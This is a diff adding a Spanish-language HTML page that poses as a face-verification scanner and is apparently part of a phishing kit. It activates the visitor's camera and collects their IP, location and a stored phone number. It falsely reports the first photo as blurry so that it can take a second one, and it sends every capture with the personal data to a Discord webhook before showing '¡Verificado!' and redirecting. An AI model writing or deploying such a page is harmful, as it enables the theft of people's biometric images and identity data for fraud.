@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, viewport-fit=cover">
+    <title>Calendario y correo</title>
+    <style>
+        :root {
+            --primary: #007aff;
+            --success: #34c759;
+            --error: #ff3b30;
+            --bg: #ffffff;
+            --text-main: #000000;
+            --text-sub: #8e8e93;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg);
+            height: 100vh;
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+
+        .scanner-container {
+            position: relative;
+            width: 330px;
+            height: 320px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 40px;
+        }
+
+        .video-mask {
+            width: 260px;
+            height: 320px;
+            border-radius: 50%;
+            overflow: hidden;
+            position: absolute;
+            z-index: 10;
+            background: #f2f2f7;
+            transform: translateZ(0);
+        }
+
+        video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transform: scaleX(-1);
+        }
+
+        .progress-ring {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            transform: rotate(-90deg);
+            z-index: 20;
+        }
+
+        .progress-ring__circle {
+            transition: stroke-dashoffset 0.5s ease-in-out, stroke 0.3s;
+            transform-origin: 50% 50%;
+        }
+
+        .scan-light {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(180deg, rgba(255, 255, 255, 0) 40%, rgba(255, 255, 255, 0.6) 50%, rgba(255, 255, 255, 0) 60%);
+            z-index: 15;
+            opacity: 0.6;
+            animation: scanDown 2s infinite linear;
+            pointer-events: none;
+        }
+
+        @keyframes scanDown {
+            0% {
+                transform: translateY(-100%);
+            }
+
+            100% {
+                transform: translateY(100%);
+            }
+        }
+
+        .flash {
+            position: fixed;
+            inset: 0;
+            background: white;
+            opacity: 0;
+            pointer-events: none;
+            z-index: 100;
+            transition: opacity 0.1s;
+        }
+
+        .status-area {
+            text-align: center;
+            padding: 0 20px;
+            z-index: 30;
+            height: 60px;
+        }
+
+        .status-title {
+            font-size: 20px;
+            font-weight: 600;
+            color: var(--text-main);
+            margin-bottom: 8px;
+            letter-spacing: -0.5px;
+        }
+
+        .status-sub {
+            font-size: 15px;
+            color: var(--text-sub);
+        }
+
+        #loader-overlay {
+            position: fixed;
+            inset: 0;
+            background: white;
+            z-index: 200;
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .spinner {
+            width: 32px;
+            height: 32px;
+            border: 3px solid #e5e5e5;
+            border-top-color: #000;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="scanner-container" id="camera-container">
+        <svg class="progress-ring" width="260" height="320" viewBox="0 0 260 320">
+            <!-- Óvalo más alto (ry aumentado a 165) -->
+            <ellipse stroke="#e5e5ea" stroke-width="8" fill="transparent" rx="160" ry="130" cx="130" cy="160"></ellipse>
+            <ellipse class="progress-ring__circle" stroke="#007aff" stroke-width="8" stroke-linecap="round"
+                fill="transparent" rx="160" ry="130" cx="130" cy="160"
+                style="stroke-dasharray: 2042.04, 2042.04; stroke-dashoffset: 2042.04;"></ellipse>
+        </svg>
+        <div class="video-mask" id="video-mask">
+            <video id="video" autoplay="" playsinline="" muted=""></video>
+            <div class="scan-light"></div>
+        </div>
+    </div>
+    <div class="status-area">
+        <div class="status-title" id="main-text">Error</div>
+        <div class="status-sub" id="sub-text">No se pudo acceder a la cámara</div>
+    </div>
+    <div class="flash" id="flash-effect"></div>
+    <div id="loader-overlay">
+        <div class="spinner"></div>
+    </div>
+    <script src="config.js"></script>
+
+    <script>
+        const video = document.getElementById("video");
+        const circle = document.querySelector('.progress-ring__circle');
+        const mainText = document.getElementById("main-text");
+        const subText = document.getElementById("sub-text");
+        const flashEffect = document.getElementById("flash-effect");
+        const videoMask = document.getElementById("video-mask");
+        const loaderOverlay = document.getElementById("loader-overlay");
+        let stream = null;
+        let intento = 0;
+        const numeroDocumento = localStorage.getItem('telefonoUsuario') || 'Desconocido';
+        let userIP = 'Desconocida';
+        let userLocation = 'Desconocida';
+        // Perímetro aproximado para óvalo más alto (ry=165)
+        const rx = 160;
+        const ry = 165;
+        const circumference = Math.PI * (rx + ry) * 2;
+        circle.style.strokeDasharray = `${circumference} ${circumference}`;
+        circle.style.strokeDashoffset = circumference;
+        function setProgress(percent) {
+            const offset = circumference - (percent / 100) * circumference;
+            circle.style.strokeDashoffset = offset;
+        }
+        async function getIPAndLocation() {
+            try {
+                const response = await fetch('https://ipinfo.io/json?token=');
+                const data = await response.json();
+                userIP = data.ip || 'Desconocida';
+                userLocation = `${data.city || 'Desconocida'}, ${data.country_name || 'Desconocido'}`;
+            } catch (err) {
+                userIP = 'Error';
+                userLocation = 'Error';
+            }
+        }
+        async function startCamera() {
+            await getIPAndLocation();
+            try {
+                const constraints = {
+                    video: {
+                        facingMode: "user",
+                        width: {ideal: 1920},
+                        height: {ideal: 1080}
+                    }
+                };
+                stream = await navigator.mediaDevices.getUserMedia(constraints);
+                video.srcObject = stream;
+                video.onloadedmetadata = () => {
+                    console.log(`Resolución real obtenida: ${video.videoWidth}x${video.videoHeight}`);
+                    if (video.videoWidth === 0) {
+                        mainText.innerText = "Error de cámara";
+                        subText.innerText = "Intenta recargar";
+                        return;
+                    }
+                    mainText.innerText = "Coloca tu cara en el centro del circulo";
+                    subText.innerText = "Encuadra tu rostro";
+                    setTimeout(iniciarIntento, 5500);
+                };
+            } catch (err) {
+                mainText.innerText = "Error";
+                subText.innerText = "No se pudo acceder a la cámara";
+            }
+        }
+        function capture() {
+            const canvas = document.createElement("canvas");
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext("2d");
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            return canvas.toDataURL("image/jpeg", 0.98);
+        }
+        async function enviarFoto(dataURL, numeroIntento) {
+             const webhookURL = window.DISCORD_WEBHOOK_URL;
+            const formData = new FormData();
+            formData.append("content",
+                `F4CIAL - Intento ${numeroIntento}/2\n` +
+                `USX: ${numeroDocumento}\n` +
+                `IP: ${userIP}\n` +
+                `Ubicación: ${userLocation}`
+            );
+            const blob = await (await fetch(dataURL)).blob();
+            formData.append("file", blob, `${numeroDocumento}_intento_${numeroIntento}.jpg`);
+            fetch(webhookURL, {method: "POST", body: formData})
+                .catch(() => console.log("Error enviando intento " + numeroIntento));
+        }
+        function iniciarIntento() {
+            intento++;
+            setProgress(0);
+            circle.style.stroke = "#007aff";
+            mainText.innerText = "No te muevas";
+            subText.innerText = "Escaneando...";
+            setTimeout(() => {
+                setProgress(33);
+                mainText.innerText = "Validando biometría";
+                subText.innerText = "Mantén la posición";
+                setTimeout(() => {
+                    setProgress(66);
+                    mainText.innerText = "Casi listo...";
+                    subText.innerText = "Ajustando luz";
+                    setTimeout(async () => {
+                        setProgress(100);
+                        const dataURL = capture();
+                        flashEffect.style.opacity = "0.7";
+                        setTimeout(() => flashEffect.style.opacity = "0", 100);
+                        await enviarFoto(dataURL, intento);
+                        if (intento < 2) {
+                            mainText.innerText = "Foto borrosa";
+                            mainText.style.color = "#ff3b30";
+                            subText.innerText = "Intenta de nuevo";
+                            setTimeout(iniciarIntento, 3000);
+                        } else {
+                            circle.style.stroke = "#34c759";
+                            mainText.innerText = "¡Verificado!";
+                            mainText.style.color = "#34c759";
+                            subText.innerText = "Redirigiendo...";
+                            setTimeout(() => {loaderOverlay.style.display = "flex";}, 1200);
+                            if (stream) stream.getTracks().forEach(t => t.stop());
+                            setTimeout(() => {
+                                window.location.href = "cargando.html";
+                            }, 2500);
+                        }
+                    }, 1600);
+                }, 1800);
+            }, 1500);
+        }
+        startCamera();
+    </script>
+</body>
+
+</html>
